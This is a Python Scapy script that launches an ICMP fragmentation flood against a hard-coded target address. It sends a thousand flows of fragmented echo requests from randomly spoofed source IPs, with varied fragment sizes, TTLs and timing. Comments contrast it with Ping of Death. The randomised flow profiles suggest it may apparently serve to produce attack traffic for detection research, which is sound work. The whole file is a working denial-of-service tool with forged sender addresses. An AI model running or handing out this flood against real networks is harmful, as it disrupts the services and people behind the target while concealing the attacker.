from scapy.all import *
import random
import time
import struct

TARGET_IP = "192.168.1.1"
FLOWS = 1000
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting ICMP Fragmentation -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip   = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    ttl      = random.randint(32, 128)
    flow_id  = random.randint(1, 65535)     # shared IP ID per flow
    icmp_id  = random.randint(0, 65535)     # ICMP identifier fixed per flow
    packets  = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow payload size — large enough to fragment
    # but NOT oversized like PoD (stays under 65535)
    size_min = random.randint(1000, 2000)
    size_max = random.randint(size_min + 500, 8000)

    # Per-flow fragment size — multiple of 8
    raw_frag  = random.randint(48, 512)
    frag_size = (raw_frag // 8) * 8
    frag_size = max(frag_size, 48)

    # Per-flow IAT profile
    iat_min  = random.uniform(0.0001, 0.005)
    iat_max  = random.uniform(iat_min + 0.001, 0.05)

    for p in range(packets):
        # Normal-sized ICMP payload — fragmented due to size
        # This differs from PoD which intentionally exceeds 65535
        payload_size = random.randint(size_min, size_max)
        full_payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        # Build ICMP header manually (8 bytes)
        # type=8 (echo request), code=0, checksum=0, id, seq
        icmp_header = struct.pack("!BBHHH",
            8,          # type: echo request
            0,          # code
            0,          # checksum (not computed)
            icmp_id,    # identifier fixed per flow
            p           # sequence increments per datagram
        )
        icmp_data = icmp_header + full_payload

        # Fragment the ICMP datagram
        offset = 0
        frags  = []
        while offset < len(icmp_data):
            chunk   = icmp_data[offset: offset + frag_size]
            is_last = (offset + frag_size) >= len(icmp_data)

            frag_pkt = IP(
                src   = src_ip,
                dst   = TARGET_IP,
                ttl   = ttl,
                proto = 1,                     # ICMP
                id    = flow_id,               # shared across fragments
                flags = 0 if is_last else 1,   # MF flag
                frag  = offset // 8            # offset in 8-byte units
            ) / Raw(load=chunk)

            frags.append(frag_pkt)
            offset += frag_size

        # Send all fragments
        send(frags, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")